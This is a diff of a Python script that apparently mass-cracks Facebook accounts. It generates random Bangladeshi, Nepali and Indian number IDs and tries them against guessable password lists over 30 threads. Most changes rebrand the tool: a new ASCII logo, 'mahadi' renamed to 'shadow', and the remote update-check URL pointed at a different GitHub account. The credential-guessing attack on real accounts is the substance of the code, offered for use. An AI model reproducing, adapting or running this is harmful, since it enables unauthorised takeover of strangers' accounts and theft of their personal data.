@@ -57,7 +57,7 @@ from requests.exceptions import ConnectionError
 
 try:
     os.system('clear')
-    srv=requests.get('https://raw.githubusercontent.com/SEFAT-MAHADI/SPIDER/main/srv.txt').text 
+    srv=requests.get('https://raw.githubusercontent.com/SEFAT-shadow/SPIDER/main/srv.txt').text 
     if "update" in srv:
         os.system('clear')
         for j in range(3000):
@@ -467,12 +467,11 @@ tokenku=[]
 def logo():
     os.system('clear')
     print(f"""         \x1b[38;5;48m          
-░█████╗░██╗░░░██╗██████╗░███████╗██████╗░
-██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗
-██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝
-██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗
-╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║
-░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝
+  __  __ ___     ___ _  _   _   ___   _____      __
+ |  \/  | _ \___/ __| || | /_\ |   \ / _ \ \    / /
+ | |\/| |   /___\__ \ __ |/ _ \| |) | (_) \ \/\/ / 
+ |_|  |_|_|_\   |___/_||_/_/ \_\___/ \___/ \_/\_/  
+                                                   
 \x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mOWONER     \x1b[1;97m● \033[38;5;46mSHOHAG-KHAN
 \x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mFacebook   \x1b[1;97m● \033[38;5;46m𝑪𝒀𝑩𝑬𝑹-𝑨𝑹𝑴𝒀
@@ -484,22 +483,22 @@ def logo():
 def linex():
         print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
-def mahadi():
+def shadow():
     os.system('clear')
     logo()
     print(f"\x1b[38;5;196m[\x1b[1;97mA\x1b[38;5;196m] \033[38;5;46mSTART RANDOM BD CRACK")
     print(f"\x1b[38;5;196m[\x1b[1;97mB\x1b[38;5;196m] \033[38;5;46mSTART RANDOM NEPAL CRACK")
     print(f"\x1b[38;5;196m[\x1b[1;97mC\x1b[38;5;196m] \033[38;5;46mSTART RANDOM INDIA CRACK")
     print(f"\x1b[38;5;196m[\x1b[1;97mD\x1b[38;5;196m]\033[38;5;46m EXIT PROGRAMMING")
-    _____mahadi_____ = input(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \033[38;5;46mSELECT \x1b[1;97m● ')
-    if _____mahadi_____ in ['A','a','01','1']:
+    ____Shadow_____ = input(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \033[38;5;46mSELECT \x1b[1;97m● ')
+    if ____Shadow_____ in ['A','a','01','1']:
         ___uids___()
-    elif _____mahadi_____ in ['B','b','02','2']:
+    elif ____Shadow_____ in ['B','b','02','2']:
         __nepal__()
-    elif _____mahadi_____ in ['C','3','03']:
+    elif ____Shadow_____ in ['C','3','03']:
         india()
     else:
-        print(f'\n\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m\x1b[38;5;196m] \033[38;5;46mCHOOSE VALID OPTION... ');mahadi()
+        print(f'\n\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m\x1b[38;5;196m] \033[38;5;46mCHOOSE VALID OPTION... ');shadow()
 
 def ___uids___():
     user=[]
@@ -518,7 +517,7 @@ def ___uids___():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with tred(max_workers=30) as SefatMahadi:
+    with tred(max_workers=30) as Sefatshadow:
         os.system('clear')
         logo()
         tl = str(len(user))
@@ -534,13 +533,13 @@ def ___uids___():
            fu = ids[:8]
            passlist = [love,ids,bu,cu,fu,'Bangla','bangla','Free Fire','free fire','@#@#@#','@@@###']
            if mhhh in ['1','01']:
-               SefatMahadi.submit(___random___,ids,passlist)
+               Sefatshadow.submit(___random___,ids,passlist)
            elif mhhh in ['2','02']:
-               SefatMahadi.submit(___random_m2___,ids,passlist)
+               Sefatshadow.submit(___random_m2___,ids,passlist)
            elif mhhh in ['3','03']:
-               SefatMahadi.submit(___random_m3___,ids,passlist)
+               Sefatshadow.submit(___random_m3___,ids,passlist)
            else:
-               SefatMahadi.submit(___random_m2___,ids,passlist)
+               Sefatshadow.submit(___random_m2___,ids,passlist)
     print('')
     linex()
     print(f"\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] PROCESS HAS BEEN COMPLETED")
@@ -565,7 +564,7 @@ def __nepal__():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with tred(max_workers=30) as SefatMahadi:
+    with tred(max_workers=30) as Sefatshadow:
         os.system('clear')
         logo()
         tl = str(len(user))
@@ -581,13 +580,13 @@ def __nepal__():
            fu = ids[:8]
            passlist = [love,ids,bu,cu,fu,'tamang','tamang123','nepali','nepal123','nepal12345','nepali','nepal12','nepal123','nepal1234','nepal12345','9848455117','1168914','9848370000','900166','5935229','98481653','98484667','98484667','98485213','98485465','512882','98485477','9848460350','3589290','9848657857','0073851','428058','854565']
            if mhhh in ['1','01']:
-               SefatMahadi.submit(___random___,ids,passlist)
+               Sefatshadow.submit(___random___,ids,passlist)
            elif mhhh in ['2','02']:
-               SefatMahadi.submit(___random_m2___,ids,passlist)
+               Sefatshadow.submit(___random_m2___,ids,passlist)
            elif mhhh in ['3','03']:
-               SefatMahadi.submit(___random_m3___,ids,passlist)
+               Sefatshadow.submit(___random_m3___,ids,passlist)
            else:
-               SefatMahadi.submit(___random_m2___,ids,passlist)
+               Sefatshadow.submit(___random_m2___,ids,passlist)
     print('')
     linex()
     print(f"\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] PROCESS HAS BEEN COMPLETED")
@@ -611,7 +610,7 @@ def india():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with tred(max_workers=30) as SefatMahadi:
+    with tred(max_workers=30) as Sefatshadow:
         os.system('clear')
         logo()
         tl = str(len(user))
@@ -627,13 +626,13 @@ def india():
            fu = ids[:8]
            passlist = ['57575752','india123','57575751','57273200','59039200',ids,love,ids[3:]]
            if mhhh in ['1','01']:
-               SefatMahadi.submit(___random___,ids,passlist)
+               Sefatshadow.submit(___random___,ids,passlist)
            elif mhhh in ['2','02']:
-               SefatMahadi.submit(___random_m2___,ids,passlist)
+               Sefatshadow.submit(___random_m2___,ids,passlist)
            elif mhhh in ['3','03']:
-               SefatMahadi.submit(___random_m3___,ids,passlist)
+               Sefatshadow.submit(___random_m3___,ids,passlist)
            else:
-               SefatMahadi.submit(___random_m2___,ids,passlist)
+               Sefatshadow.submit(___random_m2___,ids,passlist)
     print('')
     linex()
     print(f"\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] PROCESS HAS BEEN COMPLETED")
@@ -884,4 +883,4 @@ def ___random_m3___(ids,passlist):
 if __name__=="__main__":
     os.system('clear')
     os.system('git pull')
-mahadi()
+shadow()
